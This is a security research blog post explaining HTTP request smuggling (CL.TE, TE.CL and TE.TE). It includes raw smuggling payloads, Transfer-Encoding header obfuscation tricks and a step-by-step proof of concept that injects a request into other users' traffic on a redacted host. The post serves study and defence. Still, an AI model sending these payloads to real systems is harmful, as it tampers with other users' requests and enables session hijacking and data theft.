---
title: 'HTTP Request Smuggling: CL.TE and TE.CL Attack Techniques'
date: 2021-01-01T00:00:00.000Z
excerpt: >-
  Analysis of HTTP Request Smuggling (HTTP DeSync Attack): how CL.TE and TE.CL deserialization
  vulnerabilities bypass frontend security controls and poison the backend request queue
tags:
  - http
  - request-smuggling
  - web
  - cl.te
  - te.cl
  - desync
  - web-security
categories:
  - Research
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## Vulnerability Overview

HTTP Request Smuggling (HTTP DeSync Attack) is a technique that exploits differences in how a frontend server and a backend server process requests, disrupting the processing order of one or more HTTP requests received from a user.

![HTTP Request Smuggling overview](/images/blog/http-request-smuggling/Untitled.png)

A request smuggling attack lets an attacker bypass security devices, access and exfiltrate unauthorized sensitive data, or directly harm other application users.

## Vulnerability Details

A user sends a request to a frontend server, and that server forwards one or more requests to a backend server.

When a frontend server forwards an HTTP request to a backend server, it typically sends multiple requests over the same backend network connection, since this is more efficient. HTTP requests are sent in order, and the receiving server has to know where one request ends and the next begins, so it parses the HTTP request headers.

![Frontend-to-backend forwarding](/images/blog/http-request-smuggling/Untitled 1.png)

In this situation, it's critical that the frontend and backend systems agree on the boundary between requests. Otherwise, an attacker can send an ambiguous request that the two systems interpret differently.

![Request boundary desync](/images/blog/http-request-smuggling/Untitled 2.png)

An attacker makes the backend server interpret part of the frontend request as the start of the next request. Since this is effectively prepended to the next request, it interferes with how the application processes subsequent requests. This is the HTTP Request Smuggling attack.

The root cause that makes this attack possible is that web servers are rarely exposed directly to the internet. There's usually a load balancer, reverse proxy, or similar server in front that receives and forwards or distributes requests. When this frontend server passes a request to the backend server and encounters chunked encoding or a `Content-Length` header, it processes only the specified size and leaves the remaining packet data in the buffer. That leftover packet data then gets processed as part of another user's request, affecting them.

Ultimately, by processing up to a calculated size and inserting a value like `GET /test`, the next socket user's web request start will begin with `GET /test`, allowing modification of another user's actions.

Since an attacker can control another user's request, this enables not just XSS and open redirect attacks, but also attacks such as exfiltrating sensitive data to an attacker-controlled server. This is essentially an injection into the HTTP response.

## Analysis Method

The most convenient way to attempt this attack is with Burp Suite's `http-request-smuggler` extension.

The testing method is to first use the `Content-Length` and `Transfer-Encoding` headers to determine which length each of the frontend and backend servers trusts.

### CL.TE - Frontend (Content-Length), Backend (Transfer-Encoding)

The frontend sees `Content-Length: 13` and forwards the entire POST body, including `SMUGGLED`, to the backend. The backend uses chunked encoding, so it splits requests based on `0\r\n`. It therefore only processes up to the `0`, and `SMUGGLED` remains in the backend connection buffer, getting appended to the next request.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL - Frontend (Transfer-Encoding), Backend (Content-Length)

This is the opposite case of CL.TE. The frontend splits based on `0\r\n` and forwards the entire POST body to the backend. The backend follows `Content-Length: 3`, so it processes only 3 bytes - that is, up to `8` and the newline (`\r\n`) - and the rest waits in the buffer. As a result, the next request starts with `SMUGGLED`.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

The frontend forwards the entire content because it follows chunked encoding, but the backend only processes up to `8` (+`\r\n`) because it follows `Content-Length`. As a result, the next request starts with `SMUGGLED`.

### TE.TE - Frontend (Transfer-Encoding), Backend (Transfer-Encoding)

This could be a countermeasure against CL.TE and TE.CL, but there's room to bypass it using tricks such as whitespace or newline characters.

```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

By exploiting these differences in how the header is parsed, the goal is to induce either the frontend or the backend to fail to process the `Transfer-Encoding` header, creating a bypass.

To actually determine whether a target is vulnerable, you need to know whether the next request, starting with `SMUGGLED`, was processed after the initial request - in other words, whether an arbitrary web request got processed. With a simple string, you need to detect this based on errors; otherwise, you need to send the request to a test server page or use an identifiable request (404, response tampering, etc.). And you must very quickly preempt the next request to determine whether the attack succeeded.

**Caution:** the test itself can harm an unspecified number of users. Because chunked encoding leaves the server waiting and tampers with another user's request, even the tester can't immediately notice it, and it isn't only reproducible in the tester's own environment - like cache poisoning, it triggers on whichever user happens to land in that request sequence. Extreme caution is required when testing against production services.

## PoC

Let's walk through a rough example test case (TE.CL via a TE.TE bypass).

**Step 1 - Verify that Content-Length and Transfer-Encoding align:**

```http
POST /whereisthispage HTTP/1.1
Host: **********
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/plain, */*; q=0.01
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-length: 12
Transfer-Encoding : chunked

4
test
0
```

When the sizes indicated by `Content-Length` (12, up through the 0) and `Transfer-Encoding` (the position of `0\r\n`) match -> **processed normally**

**Step 2 - Introduce a length mismatch to detect which one the backend trusts:**

```http
POST /whereisthispage HTTP/1.1
Host: **********
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/plain, */*; q=0.01
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-length: 13
Transfer-Encoding : chunked

4
test
0

X
```

`Content-Length` is 13 (through the X), while the `Transfer-Encoding` boundary is 12 (through `0\r\n`) - the sizes don't match. Result: **the backend stalls, waiting for the 13th byte, `X`.**

- The frontend saw up to `0\r\n` and forwarded data up through the `0`, but the backend expects a size of 13, so it stalls after only 12 bytes arrive

This tells us that the frontend trusts TE (Transfer-Encoding) and the backend trusts CL (Content-Length).

**Step 3 - Insert the smuggled request:**

```http
POST /whereisthispage HTTP/1.1
Host: **********
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/plain, */*; q=0.01
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-length: 13
Transfer-Encoding : chunked

4
test
e3
GET /otherurl HTTP/1.1
Host: targethost?
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

By specifying `Content-Length: 13` (through `e3\r\n`), the frontend forwards the entire request body since it follows TE, while the backend follows CL and only processes up through the part before `GET /otherurl` - the rest stays behind in the backend, waiting for the next request.

Then, when another user's or the tester's request reaches that backend server, it hits `GET /otherurl` instead of the intended request (`POST ...`), opening the door to various issues such as redirects, XSS, and session hijacking.

## Mitigations

Current mitigations are limited and operationally costly:

- **Use HTTP/2 for server-to-server communication** - this completely eliminates CL/TE ambiguity, but requires large-scale infrastructure changes
- **Unify which header the frontend and backend trust** - the two servers must agree on which header takes priority, which also requires large-scale coordination
- **Validate directly at the proxy layer** - possible, but can incur significant performance overhead

Key takeaway: the attack relies on a mismatch in header trust between server layers. When actually carrying out the attack, each length value must be calculated precisely, and testing against production services must be done with great care.
